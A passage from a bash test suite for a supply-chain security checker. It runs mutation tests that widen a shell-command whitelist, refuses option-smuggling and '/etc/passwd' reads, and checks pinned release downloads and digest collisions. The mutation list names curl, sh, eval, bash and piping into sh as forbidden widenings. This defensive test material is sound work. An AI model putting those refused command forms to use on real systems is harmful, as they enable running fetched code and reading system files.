    case("an option-like word DOUBLE-QUOTED as the count substitution's pattern", BODY('test "$(grep -c -- "' + o + '" "$1")" -ge 1'))
    if o not in W["grep_options"] and o != W["end_of_options"]:
        case("an option-like word BARE in a grep option position", BODY('grep -q ' + o + ' -- "a" "$1"'))
        case("an option-like word BARE in the count substitution's option position", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
    case("an option-like word BARE after end_of_options (a second option, or a bare pattern)", BODY('grep -q -- ' + o + ' "a" "$1"'))
    case("an option-like word as cat's operand", BODY('test "$(cat -- "' + o + '")" = "a"'))
for op in W["test_unary"]:
    for v in ('"/etc/passwd"', '"x"', '"$(cat -- "$1")"', '"$(grep -c -- "a" "$1")"', '1', '.', '"$2"'):
        case("a file-test operand that is not a positional within the arguments", BODY('test ' + op + ' ' + v))
        case("a file-test operand that is not a positional within the arguments, [ form", BODY('[ ' + op + ' ' + v + ' ]'))
    case("a file test with an extra argument", BODY('test ' + op + ' "$1" "$1"'))
for extra in ('"$1"', 'x', '"a"', '--'):
    case("cat with more than one operand", BODY('test "$(cat -- "$1" ' + extra + ')" = "a"'))
    case("cat with more than one operand, as a command", BODY('cat -- "$1" ' + extra))
case("grep without end_of_options before the pattern", BODY('grep -q "a" "$1"'))
case("grep without end_of_options, in the count substitution", BODY('test "$(grep -c "a" "$1")" -ge 1'))
case("cat without end_of_options", BODY('test "$(cat "$1")" = "a"'))
case("cat without end_of_options, as a command", BODY('cat "$1"'))
case("more ARGs than max_args", 't "r" "x" bash -c \'grep -q -- . "$1"\' _' + ' "$CALLS"' * (W["max_args"] + 1))
for l in open(sys.argv[3]).read().split("\n"):
    if l:
        what, line = l.split("\t", 1); case("the refused corpus: " + what, line)
out = {"classes": {}, "total": len(L), "accepted": 0, "wrong_reason": 0}   # accepted: an expected refusal was ACCEPTED; wrong_reason: refused, but not for the expected reason
for cls, line, reason in L:
    d = out["classes"].setdefault(cls, {"n": 0, "accepted": [], "wrong_reason": []}); d["n"] += 1
    try:
        J.judge(line)
    except J.Refused as e:
        if reason is not None and reason not in str(e):
            d["wrong_reason"].append(repr(line)[:160]); out["wrong_reason"] += 1
        continue
    d["accepted"].append(repr(line)[:160]); out["accepted"] += 1
json.dump(out, open(sys.argv[4], "w"), indent=1)
PY
python3 "$work/hf_enum.py" "$work/harness_form.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$work/hf-enum.json" </dev/null
python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness enumeration:', r['total'], 'lines in', len(r['classes']), 'classes,', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$work/hf-enum.json"
while IFS= read -r cls; do
  CASE="AC16 harness enumeration: refused in every case ($cls)"
  check python3 -c "import json,sys; d=json.load(open(sys.argv[1]))['classes'][sys.argv[2]]; assert d['n'] > 0 and not d['accepted'] and not d['wrong_reason'], (d['accepted'][:5], d['wrong_reason'][:5])" "$work/hf-enum.json" "$cls"
done < <(python3 -c "import json,sys; [print(k) for k in json.load(open(sys.argv[1]))['classes'] if not k.startswith('the refused corpus: ')]" "$work/hf-enum.json")
CASE="AC16 harness enumeration: at least 3000 lines in at least 30 classes, none accepted and none refused for another reason"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['total'] >= 3000 and len([k for k in r['classes'] if not k.startswith('the refused')]) >= 30 and r['accepted'] == 0 and r['wrong_reason'] == 0, (r['total'], r['accepted'], r['wrong_reason'])" "$work/hf-enum.json"
# --- CODE mutants: the role rules that live in the parser's code are loosened one at a time in a temp copy; the enumeration and the refused corpus must
# then find an unexpected acceptance (or a refusal for another reason). A surviving mutant means no case pins that rule.
hcm=$(mktemp -d "$work/hfcode.XXXXXX")
while IFS=$'\t' read -r what old new; do
  python3 - "$work/harness_form.py" "$hcm/m.py" "$old" "$new" <<'PY'
import sys
s = open(sys.argv[1]).read(); assert s.count(sys.argv[3]) == 1, sys.argv[3]
open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
PY
  python3 "$work/hf_enum.py" "$hcm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hcm/e.json" </dev/null
  CASE="AC16 harness code mutant: $what is caught (an unexpected acceptance, or a refusal for another reason)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hcm/e.json"
done <<'EOF'
a file-test operand may be any operand (Codex R6)	args[0][1] in W["test_unary"] and args[1][2] == "pos": return	args[0][1] in W["test_unary"] and operand(args[1]): return
cat takes at least, not exactly, its operands (Sonnet R6)	if len(rest) != len(want) or any(	if len(rest) < len(want) or any(
a positional may name an argument that is not there	if t[2] == "pos" and int(t[1]) > len(args): raise	if t[2] == "pos" and int(t[1]) > 9: raise
EOF
# --- the GOLDEN whitelist (Sonnet, PR 289 round 5: the mutation run catches only the widenings it lists; a security control fails closed). The sha256 of
# HARNESS_WHITELIST as canonical JSON (sorted keys, no spaces, ASCII) must equal HARNESS_WHITELIST_GOLDEN below: ANY change to the grammar, a widening
# the mutation list does not name included, turns this suite red. Changing the grammar is therefore two deliberate edits in one reviewed diff: the
# whitelist, and this golden value (whose new value the failing case prints).
HARNESS_WHITELIST_GOLDEN=b2584723ffad2283b2d195aff694c38669d7746ef2e1dfe2520207768060371d
cat >"$work/hf_gold.py" <<'PY'
import hashlib, importlib.util, json, sys
spec = importlib.util.spec_from_file_location("hf", sys.argv[1]); m = importlib.util.module_from_spec(spec)
sys.argv = [sys.argv[1], "--file", "/dev/null"]   # harness_form.py judges only when run as a script: importing it runs nothing
spec.loader.exec_module(m)
print(hashlib.sha256(json.dumps(m.HARNESS_WHITELIST, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()).hexdigest())
PY
hfg=$(python3 "$work/hf_gold.py" "$work/harness_form.py" </dev/null)
CASE="AC16 harness whitelist: HARNESS_WHITELIST equals the reviewed golden (canonical sha256 $HARNESS_WHITELIST_GOLDEN; this tree's whitelist hashes to $hfg)"
check test "$hfg" = "$HARNESS_WHITELIST_GOLDEN"
hgd=$(mktemp -d "$work/hfgold.XXXXXX")
while IFS=$'\t' read -r what patch; do
  python3 - "$work/harness_form.py" "$hgd/m.py" "$patch" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
  CASE="AC16 harness whitelist: a widening the mutation list does not name ($what) changes the canonical hash, so the golden check is red"
  check test "$(python3 "$work/hf_gold.py" "$hgd/m.py" </dev/null)" != "$HARNESS_WHITELIST_GOLDEN"
done <<'EOF'
commands + xargs (Sonnet R4)	HARNESS_WHITELIST["commands"].append("xargs")
pipe_into + sh (Sonnet R4)	HARNESS_WHITELIST["pipe_into"].append("sh")
grep_options + -P (Sonnet R4)	HARNESS_WHITELIST["grep_options"].append("-P")
; in rule_title_chars (Sonnet R4)	HARNESS_WHITELIST["rule_title_chars"] += ";"
grep_options + -vq	HARNESS_WHITELIST["grep_options"].append("-vq")
a new key	HARNESS_WHITELIST["extra"] = []
a reordered list (order is part of the reviewed text)	HARNESS_WHITELIST["commands"].reverse()
EOF
python3 - "$work/harness_form.py" "$hgd/m.py" "pass" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
CASE="AC16 harness whitelist: a no-op patch keeps the canonical hash (the golden check detects change, not noise)"
check test "$(python3 "$work/hf_gold.py" "$hgd/m.py" </dev/null)" = "$HARNESS_WHITELIST_GOLDEN"
# --- MUTATION run (like pip-pin's): a temp copy of harness_form.py with HARNESS_WHITELIST widened by ONE token; the enumeration (positions and skips from
# the real whitelist) and the refused corpus must then report at least one line the real whitelist refuses for the expected reason that the mutant either
# ACCEPTS (an unexpected acceptance) or refuses for ANOTHER reason (the newline and CR line_chars mutants: the shape still refuses those lines, so they
# change the reason, not the verdict). The two counts are reported apart. A mutant with neither means the suite does not pin the whitelist.
cat >"$work/hf-mut.tsv" <<'EOF'
commands + curl	HARNESS_WHITELIST["commands"].append("curl")
commands + sh	HARNESS_WHITELIST["commands"].append("sh")
commands + eval	HARNESS_WHITELIST["commands"].append("eval")
commands + bash	HARNESS_WHITELIST["commands"].append("bash")
test_unary + -v	HARNESS_WHITELIST["test_unary"].append("-v")
test_unary + -R	HARNESS_WHITELIST["test_unary"].append("-R")
test_unary + -n	HARNESS_WHITELIST["test_unary"].append("-n")
test_string + ==	HARNESS_WHITELIST["test_string"].append("==")
test_count + -nt	HARNESS_WHITELIST["test_count"].append("-nt")
arg_names + other	HARNESS_WHITELIST["arg_names"].append("other")
arg_names + HOME	HARNESS_WHITELIST["arg_names"].append("HOME")
separators + &	HARNESS_WHITELIST["separators"].append("&")
separators + >	HARNESS_WHITELIST["separators"].append(">")
pipe_into + cat	HARNESS_WHITELIST["pipe_into"].append("cat")
grep_options + -f	HARNESS_WHITELIST["grep_options"].append("-f")
grep_options + -e	HARNESS_WHITELIST["grep_options"].append("-e")
grep_bare_patterns + *	HARNESS_WHITELIST["grep_bare_patterns"].append("*")
exit_status + 10	HARNESS_WHITELIST["exit_status"].append("10")
rule_title_chars + $	HARNESS_WHITELIST["rule_title_chars"] += "$"
rule_title_chars + backtick	HARNESS_WHITELIST["rule_title_chars"] += "`"
rule_title_chars + '	HARNESS_WHITELIST["rule_title_chars"] += "'"
dquote_chars + $	HARNESS_WHITELIST["dquote_chars"] += "$"
dquote_chars + backtick	HARNESS_WHITELIST["dquote_chars"] += "`"
dquote_chars + backslash	HARNESS_WHITELIST["dquote_chars"] += "\\"
dquote_chars + !	HARNESS_WHITELIST["dquote_chars"] += "!"
dquote_escapes + \$	HARNESS_WHITELIST["dquote_escapes"].append("\\$")
line_chars + newline	HARNESS_WHITELIST["line_chars"] += "\n"
line_chars + CR	HARNESS_WHITELIST["line_chars"] += "\r"
arg_path_chars + *	HARNESS_WHITELIST["arg_path_chars"] += "*"
arg_path_chars + $	HARNESS_WHITELIST["arg_path_chars"] += "$"
substitutions + ls	HARNESS_WHITELIST["substitutions"]["ls"] = ""
max_args 9 -> 10	HARNESS_WHITELIST["max_args"] = 10
negation + -	HARNESS_WHITELIST["negation"].append("-")
end_of_options not required	HARNESS_WHITELIST["end_of_options"] = ""
pattern may start with -	HARNESS_WHITELIST["pattern_first_char_not"] = ""
grep_options + --file=pats	HARNESS_WHITELIST["grep_options"].append("--file=pats")
dquote_escapes + \-	HARNESS_WHITELIST["dquote_escapes"].append("\\-")
EOF
hfm=$(mktemp -d "$work/hfmut.XXXXXX")
while IFS=$'\t' read -r what patch; do
  python3 - "$work/harness_form.py" "$hfm/m.py" "$patch" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
  python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null; cp "$hfm/e.json" "$hfm/e-$what.json"
  CASE="AC16 harness mutation: widening HARNESS_WHITELIST by one token ($what) is caught (an unexpected acceptance, or a refusal for another reason)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hfm/e.json"
  python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness mutation', sys.argv[2] + ':', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$hfm/e.json" "$what"
done <"$work/hf-mut.tsv"
CASE="AC16 harness mutation: the enumeration reports unexpected acceptances and refusals for a different reason separately (fields accepted and wrong_reason)"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert 'wrong_reason' in r and 'accepted' in r and all('accepted' in d and 'wrong_reason' in d for d in r['classes'].values())" "$work/hf-enum.json"
for m in newline CR; do
  CASE="AC16 harness mutation: line_chars + $m is caught as refusals for a different reason, with 0 unexpected acceptances (the shape still refuses the line)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] > 0, (r['accepted'], r.get('wrong_reason'))" "$hfm/e-line_chars + $m.json"
done
CASE="AC16 harness mutation: the unmutated copy (a no-op patch) is NOT flagged (the mutation run detects widening, not noise)"
python3 - "$work/harness_form.py" "$hfm/m.py" "pass" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
CASE="plain-old-prefixes: no committed row begins with an old prefix"
check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
import json, sys
OLD = ("pinned toolchain fetch, advisor reading Oct 16", "loopback fetch, advisor reading Oct 17",
       "pinned fetch, advisor reading Oct 17")
rows = json.load(open(sys.argv[1]))["unmeasured_text"]
rows = [r["line"][:12] for r in rows if r["ruling"].startswith(OLD)]
assert not rows, rows
PY
CASE="AC16: the default rulings path is the script's own checkout (.github/supply-chain-exceptions.json beside .github/agent), whatever --root says"
check python3 - "$chk" "$root" <<'PY'
import importlib.util, os, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
PY
CASE="the committed build-container install row is exactly the one apk line of bin/acceptance-egress.sh (file, form, key and line equal the hash of the whole line, no count, no context) and there is at most one; the line sits in a container whose image is pinned by digest"
check python3 - "$root/.github/supply-chain-exceptions.json" "$root/bin/acceptance-egress.sh" <<'PY'
import hashlib, json, os, re, sys
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith("build-container install, test-only: ")]
assert len(rows) <= 1, rows
line = "apk add --no-cache build-base linux-headers xz >/dev/null"
h = hashlib.sha256(line.encode()).hexdigest()
for r in rows:
    assert r["file"] == "bin/acceptance-egress.sh" and r["form"] == "a system package install" and r["key"] == r["line"] == h and "count" not in r and "context" not in r, r
    if os.path.exists(sys.argv[2]):      # the file arrives with the release chain (not on every branch): where it is present, the line is in it once and the container that runs it is a digest-pinned image
        src = open(sys.argv[2]).read()
        assert src.count(line) == 1, "the apk line is not in the file exactly once"
        pre = src.split(line)[0].rsplit("docker run", 1)[1]
        assert re.search(r"alpine:[0-9.]+@sha256:[0-9a-f]{64}", pre), "the image of the container is not pinned by digest"
PY

# a context row of the local-call form is malformed (exit 2): those rows name an item, and their check does not take a context
python3 - "$chk" <<'PY' >/dev/null 2>&1 && ok "AC16 context: a local-call row that carries a context or proof is malformed (RuntimeError, exit 2)" || bad "AC16 context: a local-call row that carries a context or proof is malformed (RuntimeError, exit 2)"
import importlib.util, json, sys, tempfile
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
h = "a" * 64
for extra in ({"context": "assignment"}, {"context": "assignment", "proof": "x"}):
    row = dict({"file": ".github/workflows/x.yml", "form": ac.LOCAL_CALL_FORM, "key": h, "line": h, "ruling": "local reusable workflow call; test"}, **extra)
    with tempfile.NamedTemporaryFile("w", suffix=".json") as f:
        json.dump({"unmeasured_text": [row]}, f); f.flush()
        try:
            ac.load_ruled_text(f.name, required=True)
        except RuntimeError:
            continue
        raise SystemExit("accepted")
PY

# --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
# its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
cat >"$work/ibt-inv.py" <<'PY'
import importlib.util, os, re, sys
SC = sys.argv[1]
HOST = "https://github.com/"
TOOLS = {"melange": "chainguard-dev/melange", "apko": "chainguard-dev/apko"}
ARCHES = ("amd64", "arm64")
def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), os.path.join(SC, name + ".py"))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
def die(msg):
    print("install-build-tools: " + msg); sys.exit(1)
def inventory(path):
    inv = load("pin-inventory"); age = load("pin-age-check")
    text = open(path).read(); f = {"bin/install-build-tools.sh": text}
    um = inv.unmeasured(f)
    if um:
        die("unmeasured: " + "; ".join("%s: %s" % (w, l) for (_, w, l) in sorted(um)))
    vers = {}
    for t in TOOLS:
        m = re.search(re.escape(HOST + TOOLS[t]) + r"/releases/download/v(\d+\.\d+\.\d+)/", text)
        if not m:
            die("no literal release address for " + t)
        vers[t] = m.group(1)
    want = {(TOOLS[t], "v" + vers[t], "%s_%s_linux_%s.tar.gz" % (t, vers[t], a)) for t in TOOLS for a in ARCHES}
    got = set()
    for it in inv.inventory(f).values():
        repo = age.TOOL_REPOS.get(it.name) or (it.name if re.fullmatch(r"[\w.-]+/[\w.-]+", it.name) else None)
        if it.kind != "tool" or not repo or not age.is_pin(it.version) or re.search(r"\$\{|\(variable\)|\(expression\)|\(unmeasured", it.name) or "#" not in it.path:
            die("not a measurable pin with its checksum bound: " + it.key)
        got.add((it.name, it.version, it.path.split("#")[0]))
    if got != want:
        die("measured %s, wanted %s" % (sorted(got), sorted(want)))
    print("measured: " + ", ".join(sorted("%s@%s %s" % g for g in got)))
def mutate(src, out, kind):
    lines = open(src).read().split("\n")
    def edit(label, rx, rep):
        for i, ln in enumerate(lines):
            if re.match(r"^\s*%s\)" % re.escape(label), ln):
                new, k = re.subn(rx, rep, ln, count=1)
                if k == 1:
                    lines[i] = new; return
        print("mutant %s did not apply" % kind); sys.exit(3)
    if kind == "variable":
        edit("melange-amd64", r"/download/v[^/]+/", "/download/v$ver/")
    elif kind == "repovar":
        edit("apko-amd64", re.escape(HOST) + r"[\w.-]+/[\w.-]+/", lambda m: HOST + "$repo/")
    elif kind == "mismatch":
        edit("apko-arm64", r"/download/v(\d+)\.(\d+)\.(\d+)/apko_\d+\.\d+\.\d+_", lambda m: "/download/v{0}.{1}.{2}/apko_{0}.{1}.{2}_".format(m.group(1), m.group(2), int(m.group(3)) + 1))
    else:
        print("unknown mutant " + kind); sys.exit(2)
    open(out, "w").write("\n".join(lines))
{"inventory": lambda: inventory(sys.argv[3]), "mutate": lambda: mutate(sys.argv[3], sys.argv[4], sys.argv[5])}[sys.argv[2]]()
PY
ibt() { python3 "$work/ibt-inv.py" "$here/../supply-chain" "$@" </dev/null >"$work/ibt.out" 2>&1; }
# ibt_refused KIND REGEX [RUNNER]: the inventory command is ibt unless a harness case names a stub as the third argument (never read from the environment)
ibt_refused() { local kind=$1 kw=$2 run=ibt; [ $# -lt 3 ] || run=$3; ibt mutate "$root/bin/install-build-tools.sh" "$work/ibt-$kind.sh" "$kind" || return 1; local rc=0; "$run" inventory "$work/ibt-$kind.sh" || rc=$?
  [ "$rc" -ne 0 ] && [ "$rc" -ne 126 ] && [ "$rc" -ne 127 ] && grep -Eq -- "$kw" "$work/ibt.out"; }   # 126/127: the inventory could not RUN, which is not a refusal
CASE="REQ-SUP-001-AC18: the real inventory measures install-build-tools.sh as 4 pins (melange and apko x amd64 and arm64, owner/repo@vX.Y.Z, checksum bound), nothing unmeasured"
check ibt inventory "$root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18: a variable version in the release address is read as a placeholder, not a pin (pin-age refuses it)"
check ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18: a variable repository in the release address is unmeasured (pin-age refuses it)"
check ibt_refused repovar 'unmeasured: a download'
CASE="REQ-SUP-001-AC18: a URL version that differs from the pinned set is measured as a version outside it"
check ibt_refused mismatch 'wanted'
# the harness itself: a failure to RUN the inventory (exit 126 not executable, 127 not found) is not a refusal, even when the output names the diagnostic
ibt_stub_rc=1 ibt_stub_msg=""
ibt_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; printf '%s' "$ibt_stub_msg" >"$work/ibt.out"; return "$ibt_stub_rc"; }
# stub_refused RC [OUTPUT]: the stub exits RC after printing OUTPUT (default: the expected diagnostic)
stub_refused() { ibt_stub_rc=$1; ibt_stub_msg=${2-install-build-tools: unmeasured: a download}; ibt_refused repovar 'unmeasured: a download' ibt_stub; }
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with the diagnostic counts as a refusal (the stub stands in correctly)"
check stub_refused 1
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be found (exit 127) is not a refusal, even with the diagnostic"
check eval '! stub_refused 127'
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be executed (exit 126) is not a refusal, even with the diagnostic"
check eval '! stub_refused 126'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with a WRONG diagnostic is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 "install-build-tools: measured something else"'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with EMPTY output is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 ""'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 0 WITH the diagnostic is not a refusal (the nonzero status is pinned)"
check eval '! stub_refused 0'
# the inventory command is never read from the environment: with IBT_RUN exported as a stub that always prints a diagnostic and exits 1,
# the real cases still run the real inventory (the stub's diagnostic never satisfies them, the real one does)
ibt_env_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; echo "install-build-tools: unmeasured: a download" >"$work/ibt.out"; return 1; }
# iso W H R CMD...: run CMD in a child bash with IBT_RUN exported as the stub; the paths and the command reach the child as ARGUMENTS, never spliced into its script
iso() { IBT_RUN=ibt_env_stub bash -c "$(declare -f ibt ibt_refused ibt_env_stub)"'
work=$1 here=$2 root=$3; shift 3; "$@"' iso-child "$@"; }
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the variable-version mutant still fails on the REAL diagnostic (not a measurable pin)"
check iso "$work" "$here" "$root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the stub's diagnostic is not what the variable-version mutant yields"
check iso "$work" "$here" "$root" eval '! ibt_refused variable "unmeasured: a download"'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the real positive case still passes"
check iso "$work" "$here" "$root" ibt inventory "$root/bin/install-build-tools.sh"
q="$work/it's a dir"; mkdir -p "$q/agent/tests" "$q/root/bin"; cp -R "$here/../supply-chain" "$q/agent/supply-chain"; cp "$root/bin/install-build-tools.sh" "$q/root/bin/"; cp "$work/ibt-inv.py" "$q/"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the real positive case still passes"
check iso "$q" "$q/agent/tests" "$q/root" ibt inventory "$q/root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the variable-version mutant still fails on the REAL diagnostic"
check iso "$q" "$q/agent/tests" "$q/root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'

# round 8 of the review (both seats): an identity digest is never truncated; brute-forced 32-bit and 40-bit collision pairs stay two items
CASE="AC19: two local references (expressions) and two with: blocks that collided under the old 32-bit and 40-bit digests are four different identities, and swapping one for the other MOVES an item"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
a, b = "./.github/workflows/${{ inputs.v81708 }}.yml", "./.github/workflows/${{ inputs.v83546 }}.yml"
assert inv._local_name(a) != inv._local_name(b)
assert len(inv._local_name(a).split("~")[1]) == 64
def tree(uses, with_):
    return {".github/workflows/a.yml": "jobs:\n  c:\n    uses: '%s'\n    with:\n      mode: %s\n" % (uses, with_)}
k1 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value98725")))
k2 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value793926")))
assert k1 != k2 and all(len(k.split("#with:")[1]) == 64 for k in k1 | k2 if "#with:" in k), (k1, k2)
j1, j2 = set(inv.inventory(tree(a, "x"))), set(inv.inventory(tree(b, "x")))
assert j1 != j2
PY

CASE="full sha256: every committed local-call row is a 64-hex key equal to its line, and a ruling that starts with the call phrase"
check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
import json, re, sys
for r in json.load(open(sys.argv[1]))["unmeasured_text"]:
    if r["form"] == "a local reusable workflow call":
        assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["ruling"].startswith("local reusable workflow call; "), r
PY

CASE="full sha256: the collision pairs both seats reproduced under the old 32-48 bit tags (a checksum set, a step tag of an expression, a default-installer step) are different identities"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def keys(files): return set(inv.inventory(files))
# a step tag: the same go install with two different input expressions
w = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: go install example.com/tool@${{ inputs.%s }}\n" % v}
assert keys(w("v205063")) != keys(w("v1326818"))
# a checksum set: the same release download with two different 64-hex checksums that collided under the 32-bit tag
c = lambda s: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          curl -fsSL https://github.com/o/r/releases/download/v1.0.0/x.tgz -o x.tgz\n          echo '%s  x.tgz' | sha256sum -c -\n" % s.rjust(64, "0")}
assert keys(c("7158")) != keys(c("1f235"))
# a default-installer step: two steps differing only outside with/uses
d = lambda n: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/setup-python@%s # v6.1.0\n        name: collision-%s\n" % ("4" * 40, n)}
assert keys(d("8189")) != keys(d("89291"))
for k in keys(c("7158")) | keys(w("v205063")):
    tag = k.split("#", 1)[1] if "#" in k else ""
    if tag.startswith(("step:", "default:")):
        assert len(tag.split(":")[-1]) == 64, k
PY

# REQ-SUP-001-AC22: the committed list names the archive index record exactly (the daily refresh pull request moves it; rule 48: no seven-day hold on Wolfi)
CASE="AC22: the committed .github/policy/base-inputs.json names build/locks/archive-index.sha256 exactly once, beside the archive key record"
check python3 - "$root/.github/policy/base-inputs.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))["base_inputs"]
assert d.count("build/locks/archive-index.sha256") == 1 and "build/locks/archive-keys.sha256" in d, d
PY

CASE="two release downloads whose asset names differ only in the shell variable (or expression) they hold are two items, a changed variable is a moved item, and a concrete asset keeps its key (REQ-SUP-001-AC2: the check names every version that moved, a moved asset behind a variable included)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def dl(asset, tag="v1.2.3", where="bin/x.sh"):
    return {where: "curl -fsSL https://github.com/o/r/releases/download/%s/%s -o x\n" % (tag, asset)}
a, b = inv.inventory(dl("${A}.tgz")), inv.inventory(dl("${B}.tgz"))
assert len(a) == 1 and len(b) == 1 and set(a) != set(b), (sorted(a), sorted(b))
assert all("#step:" in k for k in list(a) + list(b)), (sorted(a), sorted(b))
assert set(a) == set(inv.inventory(dl("${A}.tgz"))), "the same spelling must give the same key"
assert len(inv.moved(a, b)) == 1, inv.moved(a, b)
# an expression, a braced variable and a bare one: each spelling is its own key
for x, y in (("${{ matrix.os }}.tgz", "${{ matrix.arch }}.tgz"), ("$OS.tgz", "$ARCH.tgz"), ("x_${OS}.tgz", "x_${ARCH}.tgz")):
    kx, ky = set(inv.inventory(dl(x))), set(inv.inventory(dl(y)))
    assert len(kx) == 1 and len(ky) == 1 and kx != ky, (x, y, sorted(kx), sorted(ky))
# a concrete asset is unchanged: no step tag, the key the inventory has always had
assert set(inv.inventory(dl("x.tgz"))) == {"tool:o/r/x.tgz@v1.2.3"}, sorted(inv.inventory(dl("x.tgz")))
# the same asset in a workflow step, the form every workflow takes
wf = lambda asset: {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://github.com/o/r/releases/download/v1.2.3/%s -o x\n" % asset}
assert set(inv.inventory(wf("${A}.tgz"))) != set(inv.inventory(wf("${B}.tgz")))
PY

CASE="release downloads behind variables or expressions, round 1 findings: two assets in one step are two items; an identical added occurrence is a moved item; whitespace inside an expression literal is part of the identity; a scanner assignment and a composite input default are part of the identity (REQ-SUP-001-AC2: the check names every version that moved)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = lambda a: "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/" + a + " -o x"
def wf(run, name="ci.yml"):
    body = "".join("          " + l + "\n" for l in run.split("\n"))
    return {".github/workflows/" + name: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n" + body}
assert len(inv.inventory(wf(dl("${A}.tgz") + "\n" + dl("${B}.tgz")))) == 2
